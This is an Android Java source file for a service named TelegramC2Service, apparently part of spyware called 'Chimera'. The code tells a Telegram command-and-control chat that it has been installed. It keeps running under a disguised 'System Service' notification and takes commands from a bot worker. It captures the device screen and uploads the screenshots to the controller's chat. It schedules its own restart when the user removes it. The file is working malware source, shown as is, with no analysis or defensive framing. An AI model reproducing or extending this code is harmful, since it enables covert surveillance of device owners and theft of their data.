package com.chimera;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class TelegramC2Service extends Service {
    private Thread workerThread;
    private static final String CHANNEL_ID = "chimeraChannel";
    private static final int NOTIFICATION_ID = 1;

    private static MediaProjection mediaProjection;
    private HandlerThread screenshotThread;
    private Handler screenshotHandler;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            ConfigLoader.load(this);
            sendInstallMessage();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_Config", e);
        }
        createNotifChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        try {
            startWorker();
            setupScreenshotThread();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnCreate", e);
        }
    }

    private void setupScreenshotThread() {
        screenshotThread = new HandlerThread("Screenshot");
        screenshotThread.start();
        screenshotHandler = new Handler(screenshotThread.getLooper());
    }

    private void createNotifChannel() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel chan = new NotificationChannel(CHANNEL_ID, "Chimera Service", NotificationManager.IMPORTANCE_LOW);
                NotificationManager nm = getSystemService(NotificationManager.class);
                nm.createNotificationChannel(chan);
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_CreateChannel", e);
        }
    }

    private Notification createNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }
        b.setContentTitle("System Service");
        b.setSmallIcon(android.R.drawable.stat_notify_sync);
        return b.build();
    }

    private void startWorker() {
        try {
            if (workerThread == null || !workerThread.isAlive()) {
                workerThread = new Thread(new TelegramBotWorker(this));
                workerThread.start();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
        }
    }

    private void sendInstallMessage() {
        try {
            String token = ConfigLoader.getBotToken();
            long chat = ConfigLoader.getAdminId();
            if (token == null || chat == 0) return;
            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
            TelegramBotWorker.post(url, body, this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "Service_SendInstall", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "ACTION_SCREENSHOT_RESULT".equals(intent.getAction())) {
            int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
            Intent resultData = intent.getParcelableExtra("resultData");
            handleScreenshotResult(resultCode, resultData);
        } else {
            try {
                startWorker();
            } catch (Exception e) {
                ErrorLogger.logError(this, "TelegramC2Service_OnStart", e);
            }
        }
        return START_STICKY;
    }

    private void handleScreenshotResult(int resultCode, Intent data) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            }

            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection != null) {
                captureScreenshot();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "HandleScreenshotResult", e);
        }
    }

    private void captureScreenshot() {
        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getRealMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, screenshotHandler);

        imageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
                    try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                    }
                    TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
                    stopScreenshot();
                }
            } catch (Exception e) {
                ErrorLogger.logError(this, "ScreenshotCapture", e);
            } finally {
                if (image != null) image.close();
            }
        }, screenshotHandler);
    }

    private void stopScreenshot() {
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
    }

    @Override
    public void onDestroy() {
        try {
            if (workerThread != null) workerThread.interrupt();
            screenshotThread.quitSafely();
            stopScreenshot();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
            restartServiceIntent.setPackage(getPackageName());
            PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1000, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
            AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
            alarmService.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, restartServicePendingIntent);
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
        }
        super.onTaskRemoved(rootIntent);
    }
}